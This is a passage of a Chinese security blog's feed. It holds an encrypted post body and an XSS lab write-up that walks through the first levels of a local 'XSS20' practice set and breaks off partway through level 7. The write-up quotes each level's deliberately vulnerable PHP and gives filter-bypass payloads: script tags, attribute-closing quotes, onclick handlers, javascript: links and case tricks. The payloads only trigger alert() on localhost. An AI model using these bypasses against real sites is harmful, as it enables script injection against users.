G66caZVuV2zhLhNlPjcJQcaITY1AOiajubbOVLooIrHofBkE/di1jTlhEhhkV0FT5eCsuB7caLculzbQInGUA5I+QMrsyxv3X8D57t/GV5pj7GxlewZNqoujg4Kv7cdk6UwhLCUOXLyuG4ayufbH2PZ/wcv8gVzj2EyXTJp+Ycg/S9Pwyfus+UZFbTYoBYfvo+9FxBwTGfchUlG+ELhGZ8AYDWoYBRqweM1SBldQdOOVPTxoD5Fixjdh9TATTOVfP5maxYaqr8tcgPPcFDXTtIvLIWy4QLWK1A+7Jkk6oraCO31SfvfslpwG3dtCeTNW3zSZ2yfr9IAUCwx/eba5fFFvBb4F2z1U7BqDbv3FKgVOqa0mTMjqsdlob2yTbZNemXew9hI9e0tQhuXZ+lZlxWB3DQDgoLBkLqJuB25ZqkApcnC2uYG5FW0XAH+ObTT/WZJHqoa8bR+RBjfv6v06UMFY2KYmo3Wu0qSn2fDYvgIRKBiWeDNkBKOsHBiwwyNdCCuXHmuGWKT22tXx2+R6kGu+uTlm/2orbsnlb3dEKPJh5t7SfFagmCJy14034bxJy0Pf3sPf0a/l+Gwsp7VaC5Nqm2Mg/MGS0Ihid5lJ/0qs3KP9qnHy0vei2Dha5bSt11mYcJeA5veDj0Q0ykVi7KJtSpc9ep6Jkmllkbp5rAKmhBMLSu/4LDSS+T9OhfXNnIVZQIeRFa/NItIDC2in05iIoJxuI/cjEvqFQ1eKVvV/rQCnppVUg1Cj8Vdj3ijYnUB2pwnhhwUzRMhxZduVUQQkbxddlwl4jV+8cCWWMIfhUESia/3L3XCco/UOwAyOSz+sTvsflLeQoCi20NdWOj9l1u0JJ6SN6hzVhYXSEa+1eKAOXETXdZhqPbbnRznXnGKS6oHI1vlK1uBQI1HlgGaV4i2kpW5Vq1w4DOeJhFH3rz6p0aDR/M7l2kl0OIMsqOxkbgdZK4qrHL31Gyg988xEDG85Aptb4C2j7WlxLtNKpNSoefxytvdJI70gsPlKHjD9OpIM+2GquvIhNloBUOYuBQt1s1H7r4w2ZQncRih73+o4sChT09+KUU+xaOHxCSXA3makBgH/A2k8pE729t/E52QmTUODob1wIT3CMiPIPW9a4gpsJNoy5w/rACyA8o8J3nQyy5N9G+VD+8o0YeRVBNsM3JK87eaXQd19MJoB/QZpg4QauzLJDuagsmXz9AHt37CqF7M2RKP+DlMh4m3TbCfh4/Ko7YkRHqNQ/F+e169kQcwWu9QFmE//pBeajfydYas7lsm1RzX/zyCOhikFZOxbQkFp6+unzGOdV+l7MbFyxaMx0gll8spkNc1ZiJV/GDffTavTOi1amsHY2PoiZf3RZqya/NoXRt9JZ60yRIenDC/9HVfb4odeAPfrrp4sxMEcxVFPjYLy96jj1cHm1vowOSZA7p0xB0uX/sFyI8HyK68UCMlrfD5QDPvvrZYVnwGRCSjEn7uSLgK9D4qktuK8rc68zgadR4DZrW8/x/YuB0R3lbpLiC+m+CVKdsuAubB98lYjhM30KFRr/pecCuF1XcEGgP2Pnva6aZ1gVezh1h1wwi3DCNy1h1vr+HIoq1l94jvDoTIQPgoV0/eUn65JrosyoSRZSac39DWkVbHasGU9/Zz0fWem8e7wJFKpjeD68D9d5/7ALNFf92NgFRW1rOX464x4zmcmpuF2jxRrNm+OcsnhPDO9kGvhQIY+oWtu0gJJQaqCeiElvyTXdVdewZSlImi7orijZ1W2VEAFboPBjdcYM+0g/etAA62/n+Dv8C83M5uau0WGmisDs0Vf12HfegG9rzMrH8GlswS7AtRKbZ3ocaqHhl0MV2BkTzj/jWqwcoK5s4wEGxsPO3rQWLhgXxIjiaWr2fmd/R50Pd1zI+I05rnL27E07YhRbxDkPTk9HYR3FQoL1bnMK/prHgRsn/OLilA4mhebkNSiKcMYAK3F7JwyyWWdDYqG1wrUCbSgiiz/3a9uGqg5LmM4+JELJm+cFR3n5bXGErcW3Aj9DEWWmiHm7YGUbgYZA5dY03Fmv6jTN5+rqqZgX04bR9nNfKCHxavanEru7N0IhbULG9GgqxkpEHAIb0bCkLV+GIs/3reDB45Cn4Te22GlO0c3Cs42SEI65yeNhXSNb+eze061lKV1ohGUYcEsiPCKlr7xIaECDfFUOXrvEk7CbbIxelrPBKI+mH95Jb7fgol6kYvptK2PF/mG1a0emn42wS4PxU9qgavyIyAKpTEXIonqv52e/1PCQ2G19uTox7/cT5butAvPVdANIXoPq7RO2UGGufNHt/XU/gxQ7JaURVqj28uLzQdDsR95a8amJz4+BIFjE7hU0+0Y1ruOoX2LSvY+Me9gmRFRnQjOqnkPwYmvyYUGySdPOZCCTgBsSsCFBQIhkSkgOssETB/lrAbp5dPE4DxqmJunTcyKYYtMoq3521C1uimVtuttX5jhoE78wZ8+zLa+2USnn8Eig9dP1U/mrTSfRY84cO6Cfv25fbCCEfibZreE48gpUU4XxQHG7+NOpxca2+ud5xFqkBX5KvgXVepAqMGp6imhrgg/Ro1n96lyefnK05JzLW1Gn4c7Eqb3Z+Iaj5fq2TrL6Oj9PBw+ncJRUNlpR/6RQNc7tfEBFnBf2HdcxKUEbjxiaAADHHKU3Izf8r3minpYBIFCn9yCm6NC9rfg0iFGHjUAS5CJR5gcCwIJwdTPqnsyqsMKQUdp/VYUiodAmeQ7+quVGfP4Jt/TMCyGKSbUp9Dy0RWwCVM4Ywp3CS/QIeXCYBeGPfeaYCiiHn4nHHCALP76m7H+nXZnCcyBQDIVYd1FGzn7m7ON7hBHbSRLU4LmMd7V+v/8cHwvbEmPMQbd1+Ch3ac7I3UpoiGWyvjXa9ICvhE3aT1RkzvCuktiApfJd/idBIW0DHLsy4w+7MHFb4RS9RqGOhL0iVWau6XKclFM00aRAhn3pp3Z7bmh2mQ9Tt+wPMARQt5bmWta/Y0whSf7yTq/eSkGLdCcEWoWkZ+7lEYks1MZiaxjUa/7uVH3lm+I3F48tgzcKRhfryGwm2Beilv0nt7aPnuCBBhrEXqu/mEnztqE4hVxboli0sUKi+xL2x+7Z02zuSFeIZUYbDKPg6Gj8kxPD1sMPBw2OTNCG1teVJOhiq8ZFRiGBQwbKbo3NbZzP2fZyL2Up4OWbhgKyM/o8H5P8jFnDrTmuM6dn/WH5dSugZ0Rp5lHh2nlksXyiRsBwD4z5Bnf9E9m1P8KmEkEmxNTlc10n1atQL7A8uiFMnIdAsy4Lsp1gn/Ar/74MhrYsYyZZ8xanB8TlKDlimcG2XJfw/7s/cuUZUPgS3Xm4z38pWMyCJ6st6oGmWZ/Y46G7IOZEpNF+kINSOXQrXyldex+JqG9s7Envf5vqeALCWo8NXP5efpUrBN1PvPwhudTQXopCbL+Iyu8vsKnMeo8NF/0t+5jDXThz030aCpdT/gZqf1K8rOiVtGg+qv4QPxZysT1rjd9CNm27OyMPfwb94mmJrPkyLZQS/B8G063TC6eAknbM5ymlgNmUCnw6/jb2Wg6W5v9PlsAuzHG/ye5c+Q6AlQofdOO23HXJrvLRpWcvQwgCTSKt8NvE7T04yxSaXZZ/1V5tIJ1RsH7X9ggLd1nCVmrhtHGwIYG33AaO5FY7eu0dEL96g7qZDzNAmBKHweYIXhkKgw7wlsMdzcByHhJfamvWG1XEdTJmviOLCCZYbNvspqIKFj9hiq0Dfad4XH6nEDjQJ53PxEi8djC2ErcW2iRmaYzX1vCgzWiFqkmGpJFcfb9zhXJlOOo8MUZvA+0+KAGQKL5kJ2SRjg4U3Qm4imVVUkcAMFV9GRWTxNBicvhS37L3o5zRtRCMTD3at4OkOlZmF9XPVh8Jm6iq8K9vZ39JECkLT7UkwaPr4Km5WxkLcrdcp03vUojHOBGf9WJp6OyZz5um5k0x1BKLaIqWHF1heTXZ6PTfaONqdGjoCWr+EWCtIvog5mtVVfQHwYWZf/w6se2G1huRXAYyHGYV+3yNI9FXpvpD0g6ljHOwd+Svu8yrp4C+CJk9Sc3+zf5wpsmQhJXYsTSS+R5HGND3NwlMnSaNFel5tbmgWyuhcqsDs4pyxy5jKjhhQgwE9uS9MyunxCvgaZIFnhzB86ue/xa7AwdGM3UmrgwpALENthmXRj+QkZbgdjl8dWRX/cIyec6l9L38532DuOBfhsbCEECR4A4Mi2XmgZrmZy4Iz+aQEiNCveDQBRgG+GKcmliGLywwarjy8eS69oNuZxiu2kvqi5lwWqM4HH77qU9TubzJNdgw2hGwQoBwSrzER+7xfNUTizVyt2Hohx+y/1lBPz45MddhDlbm4bxbqg4fD02D7UiZ9Yf4qDKk3Lrj0aQEfISeULrywYNivqhASbKjrLlE4gEmmH99tA/nMMVwh0uOuVP8W/Ns5YAc9DQd9nGzCoPccR0/C7FFZoSlXe40yCAFN4p2VLYRFTRKvOBZvkaAKJbAIb4cJAZ3Cq/Ht2F/mXnynZFVf5SB9se86agl3x4Qkah4uBFzuBB9hJPOYJghurFosIvxMV/dTd076y43OgZJc+6CNTzRKX7RO30Xm7wuBEmld7L57/jEfe0uE8Jf71IIU1WTPQiUjP2m9hpv3p/PLcHxcB+k08DN9ajMj4TlrF9KSe9+Sx3utECaQWQc2ZKpEyKWEYIshxOF35eCZlEBVPvOACyb6MJGWw8CyhNskk9NNOxd1dMpiNoMcKpdlu4ORxHB79bSCuVfo1AP3UbyTQ5qc+Y/87o2nVvoref2JkBROuO1y9hWaitqeSNcorI1Sz4t53xte0+XarT0hsi40sFXImdFjjMocKOqhw17tAJVxspgU8Fa1nWpSCgonAsssGaWaGEyMAV7suIy+fgklwZGWFDr4bDY1IgJzvUCo+rGql1THtKkyrXPEtcfXhXBpxiXp2WtU6vRNizeIwu4zvYkgSXcSqWximoMNmznQDMq4DtYeRYqzNDVrnsBshRM943hEvYUk6lUFu1ohulHaVUEVlMAa2gzovQkpLWYHrAl2B21A/mLTsFHEXWhZuqxbjL3fTD4l7LiYxtFJ/inIklRKKjpBitU8rkxZmALpgyi9TFGGn79M7GBxsAbUWuvD8w5tq7QB1tYOp3/PHX/nMjDHZpBxsJmMIWJYPQGuUt/z/BZhZVAdkEGxP4adiZAhDRuEeKc70GcjjSFNG3BSvNR6RqWH6GMUOCOQ63AVm+Z7d+l+oVvvH/SEW/Bs+AlLr5irQMUD4K7UZMvDGeRo9PAZ81tDA9pjsXxwWCfoD09dRp4OjiByB5/+cUoO5clG0Eei57AzCF5aKDoiPm9ePyu3L5OY8lb5S0FVZScl7fBBKeh0i/LJZmoePjUr8Wn03NY6ZysYv9RKf1wPaHwL6xugEoJdOtPhxChCgYpwYU/vPrP4BSnIw8HPMnifgc6Hdi9j27nPY6oL+FB8mgcvE5vkv6h0n5xyxnVDtUM/R7F3j26YJzMWEHW1o/HRi8KHX6I5gGxJNNRWUUVCVJoCVXWcA0cnCkZ+BoJ6vqhbomD4xXw3WJjDIjUONe6YdaYDb80orpY81BG1uhEi3Tuwltp6cf/d1ALmaAL3B8X75gsjCRHlwBGzcA6h9XrAXNMS1rNYpqEzfdJw7lSzfDirjaEQHNHL8Bvz3G0JpRsnnRcuYBIyRH7Acby0dliH8RPkbCQ/EzW0j4MkJfZuxr2ppRv9OrOLloclSJ4thvqQTuR+mEG+5INOa9T0UXI2lUZk1BGk/fdGcuSVY5yyFW2oSHK83LM/1xfN+fu24gAg/SPJxCLM4LSfcLVmq61WpGtj3nqWqRIFMHMDkZAxlETBn6iIq/7lnBYRFs7vCa3LezvLdegCfaTPBdCLCwheS640FzuX32XYT0MIQ6zAO3xST2AQleFjOp4Ueagg0ZW8cZdH7NhiBR/2RTrzyWMvjZNKdOnik6n41W3wOv4sHjSdKnDL0hFDzDra+bDdXJbi+q6tVjg8IWFauPpg7EZNTCbJrJZz82wxpbJiGhuh2audxf8iUY3ZwKMO2hZvyO13rcI0sZHo6oKN+E4ZG5XcaseRQz7kVd4KkwDiHqnMllPMtN9bx4znwBKeXjIwDL9mXL1SMFqnHJHD/S8SxXVXU4qKyB/d6rLhJSVaAm5O1P4t3/NVPN7Us5VWJN3tplsrA+Y/R6fOrFQc2dhaYhK3C4M7j77eMv4361bgLK914zXEiD2HeHUMAFsXCEYBZ1SewzKEv4f3cJe+G9cpPiiTJKke3VIQXXuKuCadOzUlDqXObVAO5MiuL1/HSnGZ4yoyFnmBLvweS8EKqptblqDEKNCPmj9SNqKrmsOq2Ph90PsmSOWvVEnVx1vgF4d/yIS8jWHTGX095au3dmW0ZR7YWxyQGquWjR85Xtxuzv6XTnmD7KMdSagxowWXjrePid5hEvKicg6Gf/OpMlTVbnXL7A09OzYNGjA88CxO58kB2qpw586EwvzSr9vYOrp/OQkFtXDdCojUH4xSIhdsFRctJPSkRM+PuACimazzwYy7w5PxKbD36DkyfV4RVTpiYyX2UIvqPTLiVcG1vMDNydnY0AvNOuIk5FIg8uWDI3nweFGSHftytvzWdnlkTmeDa44pFpkudbM64uvWALIKmPME1HJpIupfwL9T16sM5iMg0PH3SkzktVnc9nzFGWacu9zmG86BJg8nWuj6vc4XyGb4UY/6vfjZGOm2c0c//N0dChfY+wi16sPyq3FRdtIJOpzP2VEEWRBRvDzS3YTYJfNy66IUUkb7fhG8riFZO+Q+IDY9Zr+cO5vw5p9WP+4if1ovvBEtTNGfHDoj25bHRuRIDIxqtvbR8s4ojz7yKitC6y2+RcB3TZu9mGP9rDaJitrgl1Rvz2RA9VzfEGyrldPCMmMu5NUwTdoMyQZRJDHpjP3C+diWON08fgO8ecUaYMR0XCkN5kZIi7UNHnOSaRFWqmiD3xy8vh/rSbnhHpTqia1Oz3OdPIWLvs69HaJP3C3Zvg9N1pRuRULSjPoFQzsidL/HZm7ftYZE4qaWNU60IvvOmtM/XqutDcBFQtMrdM3++h1CxelS6F3CFEj7OfEGz0gU6qBtM1BOdWroWLxcigH70iKUdTMF4eXtUumBWvymzsFklew5IIZGhpmXmpzDxpXASKlkbS0iePWNtC8=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      python 入坑之路
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="学一门语言" scheme="http://bobosec.top/tags/%E5%AD%A6%E4%B8%80%E9%97%A8%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>XSS20 Write-up</title>
    <link href="http://bobosec.top/2019/03/01/XSS20-Write-up/"/>
    <id>http://bobosec.top/2019/03/01/XSS20-Write-up/</id>
    <published>2019-03-01T08:03:15.000Z</published>
    <updated>2019-03-01T15:01:28.509Z</updated>
    
    <content type="html"><![CDATA[<p>学一下XSS基本应用和绕过，这篇博客会结合源码一步一步分析。</p><p>xss20 是一个在本地搭建的xss练习的集合，一共有20关。每一关考察的都不一样，从简到难。</p><p>贴一下xss20的<a href="https://share.weiyun.com/5Y8E6zO" target="_blank" rel="noopener">下载地址</a> 密码：mu7pcg</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>XSS攻击全称<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/8186208" target="_blank" rel="noopener">跨站脚本攻击</a>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面。XSS漏洞和著名的SQL<a href="https://baike.baidu.com/item/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">注入漏洞</a>一样，都是利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。</p><h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><ol><li>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</li><li>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</li><li>DOMXSS：<br>这种类型则是利用非法输入来闭合对应的html标签。<br>比如，有这样的一个a标签：<code>&lt;a href=&#39;$var&#39;&gt;&lt;/a&gt;</code>乍看问题不大，可是当$var的内容变为 <code>’ onclick=’alert(/xss/) //</code>，这段代码就会被执行。</li></ol><p>XSS常见绕过点击<a href="https://blog.csdn.net/keepxp/article/details/52054388" target="_blank" rel="noopener">这篇文章</a></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less  1"></a>Less  1</h2><p>会有提示点击开始XSS，我们点击图片开始第一关。</p><p>第一关什么输入框都没有，所以我们看到url，url中的字符长度就是下面payload的长度，所以这两个是可控变量，我们从这想办法。</p><p>URL:<code>http://localhost/XSS20/level1.php?name=test</code></p><p>我们直接在name后面跟一个alert()函数试一下</p><p><code>http://localhost/XSS20/level1.php?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>提示我们已经过关。</p><p>我们看一下关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/03/01/XSS20-Write-up/less1.jpg" alt=" "></p><p>我们可以看到在欢迎用户那里js被执行。因为第一关没有过滤任何东西，所以直接执行，不多说~</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h2><p>第二关我们在搜索框继续输入第一关payload发现回显<code>没有找到和&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;相关的结果.</code></p><p>从浏览器看一下最后被解析成了什么</p><p><img src="/2019/03/01/XSS20-Write-up/less2.jpg" alt=" "></p><p>发现<code>&lt; 和 &gt;</code>全部被转义了，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现有个htmlspecialchars()函数，这个函数作用是把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p><p>但是这里我们看到value可以被提前闭合，所以可以这样绕过：<code>1&quot;&gt;&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><p><img src="/2019/03/01/XSS20-Write-up/less2.1.jpg" alt=" "></p><p>直接闭合了value=“1”绕过</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h2><p>第三关我们继续上一关payload发现不行，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这次在keyword和查询都加了htmlspecialchars()函数转义。但是在有很多JS事件还是可以触发弹窗，没有大于和小于号所以他也不会转义。</p><ol><li>onmouseenter=alert(‘xss’)  //当鼠标移动到这里就睡触发</li><li>onclick=alert(‘xss’)             //当点击这个事件时就会触发</li><li>onclick =alert(‘xss’)           //加一个空格方便绕过</li></ol><p>我们这里用onclick试一下，但是htmlspecialchars默认配置是不过滤单引号的。只有设置了：quotestyle，才可以过滤<br>so~就用单引号来测试</p><p><code>1&#39;onclick=&#39;window.alert()</code>弹窗成功！我们看一下解析成了什么样子</p><p><img src="/2019/03/01/XSS20-Write-up/less3.jpg" alt=" "></p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h2><p>我们先拿上一次payload试一下，发现不行，看一下控制台发现这次解析的是双引号，所以只要改一下就好。</p><p><code>&quot;onclick=&quot;window.alert()</code>这样就可以弹窗了，后面的语句被构造成了：<code>&lt;input name=keyword  value=&quot;&quot;onclick=&quot;window.alert()&quot;&gt;</code></p><p>就不插图片了原理都是一样的，代码里面多了几个$str大家认真看一下就好。</p><p>PS：这几关都会有点慢，清理cookies或者多等一会儿才能弹窗</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h2><p>用了上一次payload然后看一下解析成了：<code>&lt;input name=keyword  value=&quot;&quot;o_nclick=&quot;window.alert()&quot;&quot;&gt;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现o和n被隔开了，看一下源码，不仅转义括号还有on这个单词，所以就是说之前用的事件触发就不能再用了</p><p>我们知道链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript，so我们尝试嵌入一个连接，在连接的时候调用alert，payload如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="string">'1'</span>)<span class="string">"&gt;bobosec&lt;/a&gt;"</span></span><br></pre></td></tr></table></figure><p><img src="/2019/03/01/XSS20-Write-up/less5.jpg" alt=" "></p><p>点击我们插入的超链接，即可触发弹窗，input最后被构造成这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;a href=<span class="string">"javascript:alert('1')"</span>&gt;bobosec&lt;/a<span class="string">""</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h2><p>这一关用上一关payload发现href被分开了所以不能执行</p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到很多标签都被分割了，但是这个比前一关少了<code>$str = strtolower(）</code>这个限制，也就是大小写，所以我们直接用大小写绕过就可以。</p><p><code>&quot;Onclick=&quot;window.alert(&#39;1&#39;)</code>这个也好慢2333，还以为写错了。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less 7"></a>Less 7</h2><p>看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  